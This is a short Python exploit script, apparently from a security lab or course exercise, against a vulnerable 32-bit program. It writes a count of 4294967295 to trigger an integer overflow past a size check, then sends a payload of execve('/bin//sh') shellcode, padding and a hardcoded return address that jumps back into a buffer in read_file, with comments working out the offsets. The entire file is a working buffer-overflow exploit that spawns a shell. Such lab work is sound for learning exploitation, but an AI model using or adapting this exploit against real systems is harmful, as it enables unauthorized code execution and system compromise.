from struct import pack
import sys
# Using integer overflow it seems we can bypass the count barrier
# We locate the position of the shellcode as the position in the buffer from read_file
# read_file fp = 0xbffeeb78, buf is 0xbffeeb50, so to overwrite the return address,
# We need to overwrite a total of 0x28 or 40 bytes. The shell is 23 bytes, so
# We need 17 bytes of padding

shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

num_ints = 4294967295
payload = shellcode + b'\x11' * 17 + pack("<I", 0x11111111) + pack("<I", 0xbffeeb50)

sys.stdout.buffer.write(pack("I", num_ints))
sys.stdout.buffer.write(payload)

